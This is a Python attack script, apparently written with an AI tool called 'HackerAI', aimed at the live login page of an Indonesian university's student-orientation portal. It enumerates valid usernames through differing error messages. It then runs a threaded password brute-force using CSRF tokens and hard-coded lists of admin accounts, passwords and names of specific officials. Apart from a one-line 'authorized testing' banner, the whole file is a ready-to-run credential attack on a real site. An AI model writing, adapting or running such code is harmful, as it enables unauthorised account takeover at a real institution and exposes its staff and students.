#!/usr/bin/env python3
"""
HackerAI - PKKMB UNTAD User Enumeration + Brute-Force
Authorized Penetration Testing Only
"""

import requests
import sys
import re
import threading
from queue import Queue
import time
import warnings
warnings.filterwarnings('ignore')


# ─────────────────────────────────────────────
# ADMIN USERNAMES - target utama
# ─────────────────────────────────────────────
ADMIN_USERNAMES = [
    # Admin umum
    'admin', 'administrator', 'admin_pkkmb', 'admin_untad',
    'admin_bak', 'bak_admin', 'admin_kemahasiswaan',
    'kemahasiswaan', 'kemahasiswaan_admin',
    'operator', 'operator_pkkmb', 'operator_bak',
    'panitia', 'panitia_pkkmb',
    'superadmin', 'super_admin', 'root',
    # Staff BAK
    'bak', 'baak', 'subbag_kemahasiswaan',
    'kabag_kemahasiswaan', 'kasubag_kemahasiswaan',
    # Rektorat & Pimpinan
    'rektor', 'wakil_rektor', 'wakil_rektor_3',
    'rektor_untad', 'rektorat',
    # Fakultas
    'fkip', 'fekon', 'fatek', 'fapet', 'faperta',
    'fmipa', 'fisip', 'fkh', 'fk', 'fkm',
    'fkip_admin', 'fekon_admin', 'fatek_admin',
    # Tahun angkatan
    'pkkmb2024', 'pkkmb2025', 'pkkmb2026',
    'admin2024', 'admin2025', 'admin2026',
    # Nama umum (lowercase)
    'mujib', 'abdul_mujib', 'samliok', 'samliok_ndobe',
    'ndobe',
]

# Nama-nama petugas dari dokumen
OFFICIAL_NAMES = [
    'abdul_mujib', 'samliok_ndobe', 'mujib', 'samliok',
    'ndobe',
]

# Password admin umum
ADMIN_PASSWORDS = [
    'admin', 'admin123', 'Admin123', 'Admin@123', 'admin12345',
    'administrator', 'password', 'Password123',
    'pkkmb', 'pkkmb2025', 'pkkmb2026', 'PKKMB2025', 'PKKMB2026',
    'untad', 'Untad', 'UNTAD', 'untad123', 'Untad123',
    'untad2025', 'untad2026',
    'tadulako', 'Tadulako', 'Tadulako123',
    'kemahasiswaan', 'bak', 'baak',
    'indonesia', 'Indonesia', 'merdeka', 'Merdeka45',
    'sulawesi', 'sulawesi123', 'palu', 'Palu',
    'mujib', 'samliok', 'ndobe',
    'admin123!', 'admin@123', 'Admin123!',
    'P@ssw0rd', 'p@ssw0rd', 'passw0rd',
    'root', 'toor', 'Root123',
    '123456', '12345678', '123456789',
    'rahasia', 'sandi123', 'rahasia123',
]

# Password mahasiswa (Kode Akses)
MAHASISWA_PASSWORDS = [
    '123456', '12345678', '12345',
    'pkkmb', 'pkkmb2025', 'pkkmb2026',
    'untad', 'untad123',
    'mahasiswa', 'maba', 'maba2025', 'maba2026',
    'password', 'password123',
]


class PKKMBEnum:
    def __init__(self, base_url="https://pkkmb.untad.ac.id", threads=10):
        self.base_url = base_url.rstrip('/')
        self.login_page = f"{self.base_url}/pages/auth/login.php"
        self.threads = threads
        self.lock = threading.Lock()
        self.found = False
        self.result = None
        self.valid_usernames = []
        self.found_credentials = []
        self.attempts = 0
        self.start_time = None

    def get_session_and_csrf(self):
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        try:
            resp = session.get(self.login_page, timeout=10)
            match = re.search(r'<input[^>]*name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
            if match:
                return session, match.group(1)
        except:
            pass
        return session, None

    def check_username(self, username):
        """Cek apakah username valid (exists)."""
        session, csrf = self.get_session_and_csrf()
        if not csrf:
            return None

        data = {'csrf_token': csrf, 'username': username, 'password': 'dummy_test_123'}
        
        try:
            resp = session.post(self.login_page, data=data, timeout=10)
            text = resp.text.lower()

            # Username tidak ditemukan
            if 'tidak ditemukan' in text or 'tidak aktif' in text:
                return False  # Username tidak valid
            
            # Kalau tidak ada "tidak ditemukan", berarti:
            # - Password salah (username valid!)
            # - Atau sukses (kebetulan password benar)
            if any(e in text for e in ['salah', 'gagal', 'error', 'invalid']):
                return True  # Username valid, password salah
            
            # Mungkin sukses?
            if any(s in text for s in ['dashboard', 'selamat datang', 'logout', 'beranda']):
                return 'LOGIN_SUCCESS'  # Wah, kebetulan benar!
            
            # Default: anggap valid (hindari false negative)
            return True

        except:
            return None

    def enumerate_worker(self, queue):
        """Worker untuk enumerasi username."""
        while not self.found:
            try:
                username = queue.get_nowait()
            except:
                break

            result = self.check_username(username)
            
            with self.lock:
                self.attempts += 1
                
                if result == 'LOGIN_SUCCESS':
                    elapsed = time.time() - self.start_time
                    print(f"\n{'='*60}")
                    print(f"[!!!] LANGSUNG LOGIN BERHASIL!")
                    print(f"      Username: {username}")
                    print(f"      Password: dummy_test_123 (kebetulan)")
                    print(f"{'='*60}")
                    self.found = True
                    self.result = {'username': username, 'password': 'dummy_test_123'}
                    queue.task_done()
                    break

                elif result is True:
                    self.valid_usernames.append(username)
                    print(f"  [✓] VALID: {username}")
                
                elif result is False:
                    if self.attempts % 50 == 0:
                        print(f"  [...] Sudah {self.attempts} percobaan...")
                
                # result None = error, skip

            queue.task_done()

    def brute_worker(self, queue):
        """Worker untuk brute-force password."""
        while not self.found:
            try:
                username, password = queue.get_nowait()
            except:
                break

            if self.found:
                queue.task_done()
                break

            session, csrf = self.get_session_and_csrf()
            if not csrf:
                queue.task_done()
                continue

            data = {'csrf_token': csrf, 'username': username, 'password': password}
            
            try:
                resp = session.post(self.login_page, data=data, timeout=10, allow_redirects=False)

                # Sukses
                if resp.status_code in (301, 302, 303):
                    with self.lock:
                        elapsed = time.time() - self.start_time
                        print(f"\n{'='*60}")
                        print(f"[✓] LOGIN BERHASIL!")
                        print(f"    Username: {username}")
                        print(f"    Password: {password}")
                        print(f"    Waktu:    {elapsed:.1f}s")
                        print(f"{'='*60}")
                        self.found = True
                        self.result = {'username': username, 'password': password}
                    queue.task_done()
                    break

                for cookie in session.cookies:
                    if any(k in cookie.name.lower() for k in ['ci_session', 'session', 'token', 'auth']):
                        with self.lock:
                            elapsed = time.time() - self.start_time
                            print(f"\n{'='*60}")
                            print(f"[✓] LOGIN BERHASIL! (session cookie)")
                            print(f"    Username: {username}")
                            print(f"    Password: {password}")
                            print(f"    Cookie:   {cookie.name}")
                            print(f"    Waktu:    {elapsed:.1f}s")
                            print(f"{'='*60}")
                            self.found = True
                            self.result = {'username': username, 'password': password}
                        queue.task_done()
                        break
                else:
                    with self.lock:
                        self.attempts += 1
                        if self.attempts % 30 == 0:
                            elapsed = time.time() - self.start_time
                            rate = self.attempts / elapsed if elapsed > 0 else 0
                            print(f"  [...] {self.attempts} percobaan | {rate:.1f}/dtk | {username}:{password}")

            except:
                pass

            queue.task_done()

    def enumerate_usernames(self, usernames):
        """Enumerasi username valid."""
        self.start_time = time.time()
        self.valid_usernames = []
        self.attempts = 0

        print(f"[*] Enumerasi {len(usernames)} username...")
        print(f"[*] Server akan membedakan 'username tidak ditemukan' vs 'password salah'")
        print()

        queue = Queue()
        for u in usernames:
            queue.put(u)

        workers = []
        for _ in range(min(self.threads, queue.qsize())):
            t = threading.Thread(target=self.enumerate_worker, args=(queue,))
            t.daemon = True
            t.start()
            workers.append(t)

        for t in workers:
            t.join()

        elapsed = time.time() - self.start_time
        
        print(f"\n[*] Enumerasi selesai dalam {elapsed:.1f}s")
        print(f"[*] Username valid ditemukan: {len(self.valid_usernames)}")
        for u in self.valid_usernames:
            print(f"    - {u}")

        return self.valid_usernames

    def brute_force_passwords(self, usernames, passwords):
        """Brute-force password untuk username yang valid."""
        if not usernames:
            print("[-] Tidak ada username untuk di-brute-force")
            return None

        self.start_time = time.time()
        self.found = False
        self.result = None
        self.attempts = 0

        total = len(usernames) * len(passwords)
        print(f"\n[*] Brute-force password untuk {len(usernames)} username")
        print(f"[*] Total kombinasi: {total}")
        print()

        queue = Queue()
        for u in usernames:
            for p in passwords:
                queue.put((u, p))

        workers = []
        for _ in range(min(self.threads, queue.qsize())):
            t = threading.Thread(target=self.brute_worker, args=(queue,))
            t.daemon = True
            t.start()
            workers.append(t)

        for t in workers:
            t.join()

        elapsed = time.time() - self.start_time
        
        if not self.found:
            print(f"\n[-] Brute-force selesai. {self.attempts} percobaan dalam {elapsed:.1f}s")

        return self.result


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 60)
    print("  HackerAI - PKKMB UNTAD Enumeration & Login")
    print("  Authorized Penetration Testing Only")
    print("=" * 60)

    if len(sys.argv) < 2:
        print("\nMODE:")
        print(f"  python {sys.argv[0]} --enum               Enumerasi username admin")
        print(f"  python {sys.argv[0]} --full               Enumerasi + brute-force")
        print(f"  python {sys.argv[0]} --login <user> <pass> Login tunggal")
        print(f"  python {sys.argv[0]} --brute <username>    Brute-force 1 username")
        sys.exit(1)

    engine = PKKMBEnum(threads=15)
    mode = sys.argv[1]

    # ── Login tunggal ──
    if mode == '--login' and len(sys.argv) >= 4:
        username = sys.argv[2]
        password = sys.argv[3]
        
        print(f"\n[*] Mencoba login: {username}:{password}")
        session, csrf = engine.get_session_and_csrf()
        if csrf:
            data = {'csrf_token': csrf, 'username': username, 'password': password}
            resp = session.post(engine.login_page, data=data, timeout=10, allow_redirects=False)
            
            if resp.status_code in (301, 302):
                print(f"[✓] LOGIN BERHASIL! Redirect: {resp.headers.get('Location','')}")
            elif any(k in [c.name.lower() for c in session.cookies] for k in ['ci_session', 'session']):
                print(f"[✓] LOGIN BERHASIL!")
            else:
                error = re.search(r'<div[^>]*class=["\'][^"\']*(?:error|alert|danger)[^"\']*["\'][^>]*>(.*?)</div>', resp.text, re.DOTALL)
                msg = re.sub(r'<[^>]*>', '', error.group(1)).strip() if error else 'gagal'
                print(f"[-] {msg[:150]}")
        sys.exit(0)

    # ── Brute-force 1 username ──
    if mode == '--brute' and len(sys.argv) >= 3:
        username = sys.argv[2]
        print(f"\n[*] Brute-force untuk username: {username}")
        print(f"[*] Jumlah password: {len(ADMIN_PASSWORDS)}")
        result = engine.brute_force_passwords([username], ADMIN_PASSWORDS)
        if result:
            print(f"\n[✓] Ditemukan! {result['username']}:{result['password']}")
        else:
            print(f"\n[-] Tidak ditemukan password untuk '{username}'")
        sys.exit(0)

    # ── Enumerasi ──
    if mode == '--enum':
        all_usernames = list(set(ADMIN_USERNAMES + OFFICIAL_NAMES))
        engine.enumerate_usernames(all_usernames)

        if engine.valid_usernames:
            print(f"\n[✓] Ditemukan {len(engine.valid_usernames)} username valid!")
            print("\nLanjutkan dengan:")
            print(f"  python {sys.argv[0]} --brute <username>")
            print(f"  python {sys.argv[0]} --full")
        else:
            print("\n[-] Tidak ada username admin yang valid ditemukan.")
            print("    Mungkin username menggunakan format NIM (mahasiswa).")
            print("    Coba: python tster.py --enum-mahasiswa")

    # ── Full: Enum + Brute ──
    elif mode == '--full':
        all_usernames = list(set(ADMIN_USERNAMES + OFFICIAL_NAMES))
        
        # Enumerasi dulu
        valid = engine.enumerate_usernames(all_usernames)
        
        if valid:
            # Brute-force untuk setiap username valid
            result = engine.brute_force_passwords(valid, ADMIN_PASSWORDS)
            if result:
                print(f"\n[✓] KREDENSIAL DITEMUKAN!")
                print(f"    Login: https://pkkmb.untad.ac.id/")
                print(f"    User:  {result['username']}")
                print(f"    Pass:  {result['password']}")
            else:
                print(f"\n[-] Username valid ditemukan tapi password tidak cocok.")
        else:
            print(f"\n[-] Tidak ada username valid ditemukan.")
